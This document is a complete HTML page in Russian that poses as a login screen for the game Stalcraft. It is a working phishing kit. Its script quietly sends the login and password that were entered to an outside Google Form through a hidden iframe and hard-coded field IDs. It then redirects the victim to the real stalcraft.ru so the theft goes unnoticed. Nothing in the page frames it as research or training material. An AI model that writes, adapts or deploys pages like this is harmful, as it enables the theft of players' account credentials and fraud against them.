<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stalcraft — авторизация</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
        }
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 24px;
            padding: 32px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            font-size: 28px;
            color: #1a1a2e;
            letter-spacing: 1px;
        }
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 8px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            background: #f9f9f9;
        }
        .input-group input:focus {
            outline: none;
            border-color: #4a6fa5;
            box-shadow: 0 0 0 3px rgba(74,111,165,0.2);
            background: white;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1e3c5c;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 8px;
        }
        button:hover {
            background: #0f2a44;
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: #888;
        }
        .error {
            color: #e74c3c;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <h1>STALCRAFT</h1>
                <p>Войдите в аккаунт</p>
            </div>
            <form id="loginForm">
                <div class="input-group">
                    <label>Логин или email</label>
                    <input type="text" id="login" placeholder="Введите логин" required>
                </div>
                <div class="input-group">
                    <label>Пароль</label>
                    <input type="password" id="password" placeholder="Введите пароль" required>
                </div>
                <div class="error" id="errorMsg">Заполните все поля</div>
                <button type="submit">Войти</button>
            </form>
            <div class="footer">
                <p>Войдите, чтобы продолжить игру</p>
            </div>
        </div>
    </div>

    <script>
        const GOOGLE_FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdV17RV3jR0RW7imxyfzErKjaNNGGeGyY1kwnYiGWPN49HEHA/viewform";
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const login = document.getElementById('login').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!login || !password) {
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
            document.getElementById('errorMsg').style.display = 'none';
            
            // Создаем скрытый iframe для отправки
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = 'hiddenFrame';
            document.body.appendChild(iframe);
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = GOOGLE_FORM_URL;
            form.target = 'hiddenFrame';
            form.style.display = 'none';
            
            // Поле логина (ID из твоей формы)
            const entry1 = document.createElement('input');
            entry1.type = 'text';
            entry1.name = 'entry.109981295';
            entry1.value = login;
            
            // Поле пароля (ID из твоей формы)
            const entry2 = document.createElement('input');
            entry2.type = 'text';
            entry2.name = 'entry.1413341557';
            entry2.value = password;
            
            form.appendChild(entry1);
            form.appendChild(entry2);
            document.body.appendChild(form);
            form.submit();
            
            // Редирект на официальный сайт
            setTimeout(function() {
                window.location.href = "https://stalcraft.ru/";
            }, 500);
        });
    </script>
</body>
</html>
